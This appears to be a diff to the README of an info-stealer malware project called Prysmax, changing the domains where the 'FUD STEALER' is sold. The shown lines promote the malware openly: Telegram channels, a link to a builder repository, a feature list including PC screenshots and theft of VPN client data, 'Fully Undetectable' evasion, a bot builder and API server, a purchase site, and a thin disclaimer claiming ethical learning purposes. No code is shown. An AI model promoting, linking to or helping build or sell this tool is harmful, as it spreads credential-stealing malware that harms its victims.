@@ -1,7 +1,7 @@
 # MAKE U OWN STEALER  !! 
 ## 📍 New Update
 telegram: https://t.me/prysmaxc2 
-web: https://prysmax.top FUD STEALER 
+web: https://prysmax.fun FUD STEALER 
 https://t.me/lawxszdev
 ####   🌟 STARR FOR MORE UPDATES ❤️ 
    - 🌟 If you want to compile your file go to the Prysmax repository and compile it for free and easy! - [Prysmax Compilator](https://github.com/Lawxsz/prysmax)
@@ -42,7 +42,7 @@ Telegram Channel: https://t.me/prysmaxsoftware
 - 📸 PC Screenshot
 - ❤️ Surfshark/ProtonVPN/NordVPN/CyberGhost/ExpressVPN/TunnelBear/VyprVPN/Windscribe/IPVanish/Hotspot Shield
 - 💸 with Fully Undetectable, bot builder , api server   @Lawxsz
-- Web to buy prysmax.xyz
+- Web to buy prysmax.fun 
 
 # DISCLAIMER 📛 
 - This repository is for ethical purposes and to use the scripts to learn and improve in python :)
